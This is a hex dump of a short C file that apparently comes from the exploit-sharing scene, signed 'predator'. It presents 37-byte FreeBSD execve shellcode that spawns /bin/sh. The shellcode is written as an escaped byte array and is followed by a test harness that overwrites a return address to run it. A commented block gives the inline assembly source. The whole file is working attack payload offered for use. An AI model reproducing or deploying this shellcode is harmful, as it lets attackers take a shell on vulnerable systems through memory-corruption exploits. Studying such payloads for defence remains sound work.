00000000  2f 2a 20 54 68 69 73 20  69 73 20 46 72 65 65 42  |/* This is FreeB|
00000010  53 44 20 65 78 65 63 76  65 28 29 20 63 6f 64 65  |SD execve() code|
00000020  2e 49 74 20 69 73 20 33  37 20 62 79 74 65 73 20  |.It is 37 bytes |
00000030  6c 6f 6e 67 2e 49 27 6c  6c 20 74 72 79 20 74 6f  |long.I'll try to|
00000040  20 6d 61 6b 65 20 69 74  20 2a 0d 0a 20 2a 20 73  | make it *.. * s|
00000050  6d 61 6c 6c 65 72 2e 54  69 6c 6c 20 74 68 65 6e  |maller.Till then|
00000060  20 75 73 65 20 74 68 69  73 20 6f 6e 65 2e 20 20  | use this one.  |
00000070  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000090  20 20 20 20 20 2a 0d 0a  20 2a 20 20 20 20 20 20  |     *.. *      |
000000a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000000c0  20 73 69 67 6e 65 64 20  70 72 65 64 61 74 6f 72  | signed predator|
000000d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000e0  20 2a 0d 0a 20 2a 20 20  20 20 20 20 20 20 20 20  | *.. *          |
000000f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000100  20 20 20 20 20 20 20 20  20 20 20 20 20 70 72 65  |             pre|
00000110  65 64 61 74 6f 72 28 61  74 29 73 65 6e 64 6d 61  |edator(at)sendma|
00000120  69 6c 28 64 6f 74 29 72  75 20 20 20 20 2a 0d 0a  |il(dot)ru    *..|
00000130  20 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  | ***************|
00000140  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000170  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2f 0d 0a 0d 0a 63  |**********/....c|
00000180  68 61 72 20 46 72 65 65  42 53 44 5f 63 6f 64 65  |har FreeBSD_code|
00000190  5b 5d 3d 0d 0a 22 5c 78  65 62 5c 78 31 37 5c 78  |[]=.."\xeb\x17\x|
000001a0  35 62 5c 78 33 31 5c 78  63 30 5c 78 38 38 5c 78  |5b\x31\xc0\x88\x|
000001b0  34 33 5c 78 30 37 5c 78  38 39 5c 78 35 62 5c 78  |43\x07\x89\x5b\x|
000001c0  30 38 5c 78 38 39 5c 78  34 33 5c 78 30 63 5c 78  |08\x89\x43\x0c\x|
000001d0  35 30 5c 78 38 64 22 0d  0a 22 5c 78 35 33 5c 78  |50\x8d".."\x53\x|
000001e0  30 38 5c 78 35 32 5c 78  35 33 5c 78 62 30 5c 78  |08\x52\x53\xb0\x|
000001f0  33 62 5c 78 35 30 5c 78  63 64 5c 78 38 30 5c 78  |3b\x50\xcd\x80\x|
00000200  65 38 5c 78 65 34 5c 78  66 66 5c 78 66 66 5c 78  |e8\xe4\xff\xff\x|
00000210  66 66 2f 62 69 6e 2f 73  68 22 3b 0d 0a 0d 0a 69  |ff/bin/sh";....i|
00000220  6e 74 20 6d 61 69 6e 28  29 7b 0d 0a 20 69 6e 74  |nt main(){.. int|
00000230  20 2a 72 65 74 3d 28 69  6e 74 20 2a 29 28 26 72  | *ret=(int *)(&r|
00000240  65 74 2b 32 29 3b 0d 0a  20 70 72 69 6e 74 66 28  |et+2);.. printf(|
00000250  22 6c 65 6e 20 3a 20 25  64 5c 6e 22 2c 73 74 72  |"len : %d\n",str|
00000260  6c 65 6e 28 46 72 65 65  42 53 44 5f 63 6f 64 65  |len(FreeBSD_code|
00000270  29 29 3b 0d 0a 20 2a 72  65 74 3d 28 69 6e 74 29  |));.. *ret=(int)|
00000280  46 72 65 65 42 53 44 5f  63 6f 64 65 3b 0d 0a 7d  |FreeBSD_code;..}|
00000290  0d 0a 0d 0a 2f 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |..../***********|
000002a0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
000002b0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 0d 0a  |**************..|
000002c0  20 2a 69 6e 74 20 6d 61  69 6e 28 29 7b 20 20 20  | *int main(){   |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002e0  20 20 20 20 20 20 20 20  20 2a 0d 0a 20 2a 20 20  |         *.. *  |
000002f0  20 5f 5f 61 73 6d 5f 5f  28 22 6a 6d 70 20 20 63  | __asm__("jmp  c|
00000300  61 6c 6c 6d 65 20 20 20  20 20 20 20 20 20 5c 6e  |allme         \n|
00000310  22 20 20 20 20 2a 0d 0a  20 2a 20 20 20 20 20 20  |"    *.. *      |
00000320  20 20 20 20 20 22 6a 6d  70 6d 65 3a 20 20 20 20  |     "jmpme:    |
00000330  20 20 20 20 20 20 20 20  20 20 5c 6e 22 20 20 20  |          \n"   |
00000340  20 2a 0d 0a 20 2a 20 20  20 20 20 20 20 20 20 20  | *.. *          |
00000350  20 22 70 6f 70 20 25 65  62 78 20 20 20 20 20 20  | "pop %ebx      |
00000360  20 20 20 20 20 20 5c 6e  22 20 20 20 20 2a 0d 0a  |      \n"    *..|
00000370  20 2a 20 20 20 20 20 20  20 20 20 20 20 22 78 6f  | *           "xo|
00000380  72 6c 20 25 65 61 78 2c  25 65 61 78 20 20 20 20  |rl %eax,%eax    |
00000390  20 20 5c 6e 22 20 20 20  20 2a 0d 0a 20 2a 20 20  |  \n"    *.. *  |
000003a0  20 20 20 20 20 20 20 20  20 22 6d 6f 76 62 20 25  |         "movb %|
000003b0  61 6c 2c 30 78 37 28 25  65 62 78 29 20 20 5c 6e  |al,0x7(%ebx)  \n|
000003c0  22 20 20 20 20 2a 0d 0a  20 2a 20 20 20 20 20 20  |"    *.. *      |
000003d0  20 20 20 20 20 22 6d 6f  76 6c 20 25 65 62 78 2c  |     "movl %ebx,|
000003e0  30 78 38 28 25 65 62 78  29 20 5c 6e 22 20 20 20  |0x8(%ebx) \n"   |
000003f0  20 2a 0d 0a 20 2a 09 20  20 20 20 20 22 6d 6f 76  | *.. *.     "mov|
00000400  6c 20 25 65 61 78 2c 30  78 63 28 25 65 62 78 29  |l %eax,0xc(%ebx)|
00000410  20 5c 6e 22 20 20 20 20  2a 0d 0a 20 2a 20 20 20  | \n"    *.. *   |
00000420  20 20 20 20 20 20 20 20  22 70 75 73 68 20 25 65  |        "push %e|
00000430  61 78 20 20 20 20 20 20  20 20 20 20 20 5c 6e 22  |ax           \n"|
00000440  20 20 20 20 2a 0d 0a 20  2a 09 20 20 20 20 20 22  |    *.. *.     "|
00000450  6c 65 61 6c 20 30 78 38  28 25 65 62 78 29 2c 25  |leal 0x8(%ebx),%|
00000460  65 64 78 20 5c 6e 22 20  20 20 20 2a 0d 0a 20 2a  |edx \n"    *.. *|
00000470  09 20 20 20 20 20 22 70  75 73 68 20 25 65 64 78  |.     "push %edx|
00000480  20 20 20 20 20 20 20 20  20 20 20 5c 6e 22 20 20  |           \n"  |
00000490  20 20 2a 0d 0a 20 2a 09  20 20 20 20 20 22 70 75  |  *.. *.     "pu|
000004a0  73 68 20 25 65 62 78 20  20 20 20 20 20 20 20 20  |sh %ebx         |
000004b0  20 20 5c 6e 22 20 20 20  20 2a 0d 0a 20 2a 09 20  |  \n"    *.. *. |
000004c0  20 20 20 20 22 6d 6f 76  62 20 24 30 78 33 62 2c  |    "movb $0x3b,|
000004d0  25 61 6c 20 20 20 20 20  20 5c 6e 22 20 20 20 20  |%al      \n"    |
000004e0  2a 0d 0a 20 2a 20 20 20  20 20 20 20 20 20 20 20  |*.. *           |
000004f0  22 70 75 73 68 20 25 65  61 78 09 20 20 20 20 20  |"push %eax.     |
00000500  20 20 20 20 20 5c 6e 22  20 20 20 20 2a 0d 0a 20  |     \n"    *.. |
00000510  2a 20 20 20 20 20 20 20  20 20 20 20 22 69 6e 74  |*           "int|
00000520  20 24 30 78 38 30 20 20  20 20 20 20 20 20 20 20  | $0x80          |
00000530  20 5c 6e 22 20 20 20 20  2a 0d 0a 20 2a 20 20 20  | \n"    *.. *   |
00000540  20 20 20 20 20 20 20 20  22 63 61 6c 6c 6d 65 3a  |        "callme:|
00000550  09 20 20 20 20 20 20 20  20 20 20 5c 6e 22 20 20  |.          \n"  |
00000560  20 20 2a 0d 0a 20 2a 20  20 20 20 20 20 20 20 20  |  *.. *         |
00000570  20 20 22 63 61 6c 6c 20  6a 6d 70 6d 65 20 20 20  |  "call jmpme   |
00000580  20 20 20 20 20 20 20 5c  6e 22 20 20 20 20 2a 0d  |       \n"    *.|
00000590  0a 20 2a 20 20 20 20 20  20 20 20 20 20 20 22 2e  |. *           ".|
000005a0  73 74 72 69 6e 67 20 5c  22 2f 62 69 6e 2f 73 68  |string \"/bin/sh|
000005b0  5c 22 20 5c 6e 22 29 3b  20 20 2a 0d 0a 20 2a 7d  |\" \n");  *.. *}|
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000005e0  20 20 20 20 20 20 2a 0d  0a 20 2a 2a 2a 2a 2a 2a  |      *.. ******|
000005f0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000610  2a 2a 2a 2f                                       |***/|
00000614
